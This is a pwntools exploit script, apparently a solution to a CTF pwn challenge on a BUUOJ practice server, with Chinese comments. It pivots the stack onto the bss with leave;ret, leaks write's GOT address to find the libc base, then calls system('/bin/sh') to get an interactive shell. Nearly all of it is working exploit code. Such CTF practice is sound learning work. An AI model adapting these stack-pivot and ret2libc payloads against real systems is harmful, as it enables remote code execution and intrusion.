from pwn import *

r = remote('node5.buuoj.cn', 27371)
# r = process(r'../pwn_file/[Black Watch 入群题]PWN_spwn')
elf = ELF(r'../pwn_file/[Black Watch 入群题]PWN_spwn')
libc = ELF(r'/Users/metastor/Hacker/10-CTF/pwn_wp/libc/libc-2.23_32.so')
context.log_level = 'debug'

vuln_addr = 0x804849B
# main_addr = 0x8048513
main_addr = elf.symbols['main']
bss_addr = 0x804A300
read_to_bss_addr = 0x80484C7
leave_ret = 0x08048511  # 0x08048408 : leave ; ret
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
write_plt = elf.plt['write']
write_got = elf.got['write']

# 预设ebp下一次在bss上伪造栈并跳转的位置为：bss + 0x60
# 伪造栈1：使用puts函数泄漏puts的got表地址
# （不知道为什么，失败，报错：Run till exit from #0  0xf7d7d3ed in __GI__IO_puts (str=0x804a010 <puts@got[plt]> "\240\322\327", <incomplete sequence \367>) at ./libio/ioputs.c:36）
# payload = p32(bss_addr + 0x60) + p32(puts_plt) + p32(0xaaa) + p32(puts_got)
# 改用write函数成功
payload = p32(bss_addr + 0x60) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0x4)
# 也可以直接在bss开头处构造，只不过怕bss太靠进got表区域导致覆盖
# payload = b'A' * 4 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0x4)
r.sendlineafter(b'name?', payload)

# 跳转bss上
payload2 = b'A' * 0x18 + p32(bss_addr) + p32(leave_ret)
r.sendafter(b'say?', payload2)
# print(r.recvall())
write_addr = u32(r.recv(4))
libc_base = write_addr - libc.sym['write']

print(f"write_addr: {str(hex(write_addr))}")
print(f"base_addr: {str(hex(libc_base))}")

system_addr = libc_base + libc.sym['system']
sh_addr = libc_base + libc.search(b'/bin/sh').__next__()

print(f"system_addr: {str(hex(system_addr))}")
print(f"sh_addr: {str(hex(sh_addr))}")

# 伪造栈2：在bss+0x60处开始构造shellcode，这时的ebp直接出栈没用了，所以随便写p32(0xaaaa)
execve_payload = b'A' * 0x60 + p32(0xaaaa) + p32(system_addr) + p32(0) + p32(sh_addr)
# 也可以直接在bss开头处构造，只不过怕bss太靠进got表区域导致覆盖
# execve_payload = b'A' * 4 + p32(system_addr) + p32(0) + p32(sh_addr)
r.sendlineafter(b'name?', execve_payload)
payload3 = b'A' * 0x18 + p32(bss_addr + 0x60) + p32(leave_ret)
# payload3 = b'A' * 0x18 + p32(bss_addr) + p32(leave_ret)
r.sendafter(b'say?', payload3)  # 避坑！这里不能sendline()，他会在发送的数据末尾加一个回车，导致下一个read函数只读到'\n'就结束了
r.interactive()
